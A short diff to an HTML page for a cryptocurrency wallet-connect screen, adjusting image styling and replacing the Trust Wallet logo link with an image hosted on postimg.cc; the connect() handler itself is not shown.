@@ -22,7 +22,7 @@
     .wallet-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2rem; margin: 2.5rem 0; }
     .wallet-item { cursor: pointer; transition: all 0.4s ease; text-align: center; padding: 1.5rem; border-radius: 1.2rem; background: rgba(255,255,255,0.03); border: 1px solid rgba(168, 85, 247, 0.2); }
     .wallet-item:hover { transform: scale(1.12); background: rgba(168, 85, 247, 0.15); box-shadow: 0 0 30px rgba(168, 85, 247, 0.5); }
-    .wallet-item img { width: 100px; height: 100px; object-fit: contain; margin: 0 auto; }
+    .wallet-item img { width: 100px; height: 100px; object-fit: contain; margin: 0 auto; display: block; }
     .reviews { padding: 2.5rem; background: rgba(0,0,0,0.4); border-radius: 1.5rem; margin-top: 4rem; backdrop-filter: blur(10px); }
     .review { background: rgba(255,255,255,0.04); padding: 1.5rem; border-radius: 1rem; margin: 1.5rem 0; border-left: 4px solid #a855f7; }
     .scroll-arrow { position: fixed; bottom: 3rem; left: 50%; transform: translateX(-50%); font-size: 3.5rem; color: #a855f7; animation: bounce 2s infinite; cursor: pointer; z-index: 100; opacity: 0.8; }
@@ -86,7 +86,7 @@
           <p class="mt-4 text-2xl font-semibold">MetaMask</p>
         </div>
         <div class="wallet-item" onclick="connect('Trust Wallet')">
-          <img src="https://trustwallet.com/assets/trust-wallet-logo.svg" class="mx-auto">
+          <img src="https://i.postimg.cc/k6sJrC1k/image.png" class="mx-auto">
           <p class="mt-4 text-2xl font-semibold">Trust Wallet</p>
         </div>
         <div class="wallet-item" onclick="connect('Phantom')">
